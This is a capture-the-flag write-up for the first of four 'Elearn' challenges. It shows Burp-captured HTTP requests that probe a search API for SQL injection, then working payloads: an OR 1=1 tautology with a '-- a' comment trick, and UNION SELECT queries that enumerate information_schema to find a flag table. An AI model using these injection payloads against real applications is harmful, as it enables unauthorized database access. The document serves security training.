# Elearn (4 challenges)

### Summary
1. SQLi on API endpoint -> Flag
2. Broken Access Control via Improper Verification of JWT -> Flag
3. Admin Privileges -> PUT Access to API Endpoint -> Flag
4. ???

# Elearn (1/4) - SQLi?
This is SQLi - but not the workshop SQLi. You see, there are many different types of SQL databases out there, each comes with their own syntax.

This is a React App. Hence, we should use Burp even more to enumerate all those pesky endpoints which are hidden away from us. :3

SQLi often occurs in search functionality, we can try performing a search query.

``````
GET /api/modules/search/test123 HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODEyNjMsImlhdCI6MTU5NjM4MDk2MywibmJmIjoxNTk2MzgwOTYzLCJpZGVudGl0eSI6MX0._8CFBnURoNC0x2mXJnGD5RllGn8oPsJ25oc-S4k3lFM
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
We notice that our query is appended to the URL. We can try modifying the request in Burp by appending a '
``````
GET /api/modules/search/test123' HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODEyNjMsImlhdCI6MTU5NjM4MDk2MywibmJmIjoxNTk2MzgwOTYzLCJpZGVudGl0eSI6MX0._8CFBnURoNC0x2mXJnGD5RllGn8oPsJ25oc-S4k3lFM
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
We get our '500 INTERNAL SERVER ERROR' which means that this endpoint is probably SQLi vulnerable!

There is a caveat to this however, you may notice that the standard 'OR 1=1-- will still give a '500 INTERNAL SERVER ERROR'. However, its because there's a caveat to this. The syntax for comments in MySQL databases
``````
-- comment goes here
`````` 
Yep that's right! You need a space and a character after the payload. So you will have to append 'OR 1=1-- a instead! I strongly recommend for the escaping character in SQLi payloads to be '-- a' as it fits all the different types of SQL databases you will encounter!
``````
GET /api/modules/search/e 'OR 1=1-- a HTTP/1.1
Host: chals.whitehacks.ctf.sg:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://chals.whitehacks.ctf.sg:5000/home
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTYzODIwNjQsImlhdCI6MTU5NjM4MTc2NCwibmJmIjoxNTk2MzgxNzY0LCJpZGVudGl0eSI6MX0.osPzLbz-apKmy2t77ps7hRatSPK4PZTow7eSf4EWbvw
Connection: close
Cookie: __cfduid=db55fdf3f4b3c7b3f017d3dc71893b0ab1596329705
``````
The rest is just simple SQLi database enumeration from there as seen from the workshop!
``````
GET /api/modules/search/e 'UNION SELECT NULL,table_name from information_schema.tables-- a 
GET /api/modules/search/e 'UNION SELECT NULL,column_name from information_schema.columns WHERE table_name='flag'-- a 
``````
